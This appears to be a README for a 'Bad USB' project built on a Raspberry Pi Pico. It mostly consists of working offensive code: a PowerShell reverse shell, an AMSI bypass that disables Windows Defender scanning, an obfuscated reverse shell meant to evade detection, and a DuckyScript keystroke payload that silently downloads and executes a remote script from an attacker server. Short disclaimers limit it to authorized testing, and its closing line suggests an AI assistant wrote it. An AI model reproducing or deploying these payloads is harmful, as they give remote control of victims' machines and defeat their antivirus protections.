# Pico Turned Bad USB

PowerShell Pentest Scripts
This repository contains several PowerShell scripts and DuckyScript payloads for red teaming, CTFs, or educational research on Windows targets.
Use responsibly and only on systems you are authorized to test.

File 1: Reverse Shell (PowerShell)
Script:

powershell
$client = New-Object System.Net.Sockets.TCPClient("YOUR_IP",L_PORT);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush()
};
$client.Close()
Purpose:
Establishes a reverse TCP shell from the target machine to an attacker's server. Once connected, the attacker can execute PowerShell commands on the victim's machine remotely, and the output is sent back over the same connection.

How it works:

Connects to the attacker's machine (YOUR_IP/L_PORT must be set).

Waits for commands, executes them with iex, and returns output.

Keeps the shell open until the connection closes.

File 2: Windows Defender Bypass & Obfuscated Reverse Shell
Defender Bypass
powershell
$s = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$s::amsiInitFailed = $true;
Purpose:
Disables Windows Antimalware Scan Interface (AMSI), helping PowerShell scripts evade detection by Windows Defender.

Obfuscated Reverse Shell
powershell
$ip='YOUR_IP';$p=L_PORT;
$tc='System.Net.Sockets.TCPClient';$t=New-Object ($tc) ($ip,$p);
$s=$t.GetStream();
$buf=0..65535|%{0};
$enc='System.Text.ASCIIEncoding';
while(($i=$s.Read($buf,0,$buf.Length)) -ne 0){
    $d=(New-Object -TypeName $enc).GetString($buf,0,$i);
    $sb=(iex $d 2>&1 | Out-String );
    $sb2 = $sb+'PS '+(pwd).Path+'> ';
    $send=([text.encoding]::ASCII).GetBytes($sb2);
    $s.Write($send,0,$send.Length);$s.Flush()
};$t.Close()
Purpose:
A reverse shell using shorter, variable-based names to hinder detection.

How it works:

Obfuscates variable and type names.

Connects back to attacker's server with IP and port.

Receives commands, executes, sends output back.

File 3: DuckyScript – Remote Loader
text
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 800
STRING IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP:PORT/YOUR_FILE.ps1')
ENTER
Purpose:
This DuckyScript automates opening the Windows Run dialog, launching a hidden PowerShell window, and executing a remote PowerShell payload downloaded from your server.

How it works:

Waits 1 second, then opens the Run dialog (GUI r).

Types and runs a hidden PowerShell session.

Downloads and executes a remote PowerShell script using IEX (Invoke-Expression) and Net.WebClient.

Customization:

Replace YOUR_IP, L_PORT, and YOUR_FILE.ps1 with your server details and script filename.

Ensure your server is accessible from the target.

⚠️ Legal Notice
These scripts are for educational purposes and authorized testing only.
Unauthorized use is illegal and unethical.

Let me know if you want these explanations formatted or expanded differently!
